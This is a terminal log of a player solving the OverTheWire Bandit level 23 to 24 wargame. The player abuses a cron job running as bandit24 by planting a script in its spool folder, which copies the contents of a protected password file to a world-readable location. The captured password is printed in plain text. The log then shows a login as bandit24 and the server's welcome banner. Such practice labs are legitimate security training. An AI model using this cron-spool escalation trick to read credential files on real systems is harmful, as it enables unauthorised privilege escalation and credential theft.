bandit23@bandit:~$
bandit23@bandit:~$ cd ../../etc/cron.d
bandit23@bandit:/etc/cron.d$ 
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ 
bandit23@bandit:/etc/cron.d$ 
bandit23@bandit:/etc/cron.d$ cat ../../usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done


bandit23@bandit:/etc/cron.d$ mkdir /tmp/hackBoi
bandit23@bandit:/etc/cron.d$ nano /tmp/hack.sh
Unable to create directory /home/bandit23/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/hack.sh
bandit23@bandit:/etc/cron.d$ cp /tmp/hack.sh /var/spool/bandit24
bandit23@bandit:/etc/cron.d$ 
bandit23@bandit:/etc/cron.d$ cd /tmp
bandit23@bandit:/tmp$ 
bandit23@bandit:/tmp$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/tmp$ mkdir hackBoi
bandit23@bandit:/tmp$ cp hack.sh /hackBoi/hack.sh
cp: cannot create regular file '/hackBoi/hack.sh': No such file or directory
bandit23@bandit:/tmp$ 
bandit23@bandit:/tmp$ cd hackBoi
bandit23@bandit:/tmp/hackBoi$ ls
bandit23@bandit:/tmp/hackBoi$ cd ..
bandit23@bandit:/tmp$ chmod 777 hackBoi
bandit23@bandit:/tmp$ cd hackBoi
bandit23@bandit:/tmp/hackBoi$ 
bandit23@bandit:/tmp/hackBoi$ nano hack.sh
Unable to create directory /home/bandit23/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit23@bandit:/tmp/hackBoi$ 
bandit23@bandit:/tmp/hackBoi$ ls
hack.sh
bandit23@bandit:/tmp/hackBoi$ chmod hack.sh
chmod: missing operand after ‘hack.sh’
Try 'chmod --help' for more information.
bandit23@bandit:/tmp/hackBoi$ nano hack.sh 
Unable to create directory /home/bandit23/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit23@bandit:/tmp/hackBoi$ 
bandit23@bandit:/tmp/hackBoi$ ls
hack.sh
bandit23@bandit:/tmp/hackBoi$ chmod 777 hack.sh 
bandit23@bandit:/tmp/hackBoi$ 
bandit23@bandit:/tmp/hackBoi$ 
bandit23@bandit:/tmp/hackBoi$ cp /tmp/hackBoi/hack.sh /var/spool/bandit24/
bandit23@bandit:/tmp/hackBoi$ 
bandit23@bandit:/tmp/hackBoi$ cat hack.sh 
myname=$(whoami)
cat /etc/bandit_pass/bandit24 > /tmp/hackBoi/pass.txt
bandit23@bandit:/tmp/hackBoi$ cp /tmp/hackBoi/hack.sh /var/spool/bandit24/
bandit23@bandit:/tmp/hackBoi$ ls
hack.sh
bandit23@bandit:/tmp/hackBoi$ 
bandit23@bandit:/tmp/hackBoi$ ls
hack.sh  pass.txt
bandit23@bandit:/tmp/hackBoi$ cat pass.txt 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
bandit23@bandit:/tmp/hackBoi$ logout
There are stopped jobs.
bandit23@bandit:/tmp/hackBoi$ ^C
bandit23@bandit:/tmp/hackBoi$ ^C
bandit23@bandit:/tmp/hackBoi$ logout
Received SIGHUP or SIGTERM

Buffer written to hack.sh.save
Received SIGHUP or SIGTERM

Buffer written to /tmp/stuff.sh.save
Received SIGHUP or SIGTERM
Error writing nano.save: Permission denied
Buffer not written to nano.save: Permission denied
Connection to bandit.labs.overthewire.org closed.
jonesy@ubuntu:~/security6841/overTheWire$ 
jonesy@ubuntu:~/security6841/overTheWire$ ssh bandit24@bandit.labs.overthewire.org -p 2220
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit24@bandit.labs.overthewire.org's password: 
Linux bandit 4.18.12 x86_64 GNU/Linux
               
      ,----..            ,----,          .---. 
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' ' 
  |   :  | ; | ' ;    |.';  ; ;   \  \;      : 
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ; 
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"  
     \   \ .'        ;   |.'       \   \ ;     
  www. `---` ver     '---' he       '---" ire.org     
               
              
Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames. 
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with 
  easily guessable or short names will be periodically deleted!
	
  Please play nice:
      
    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS! 
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro 

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

bandit24@bandit:~$ 
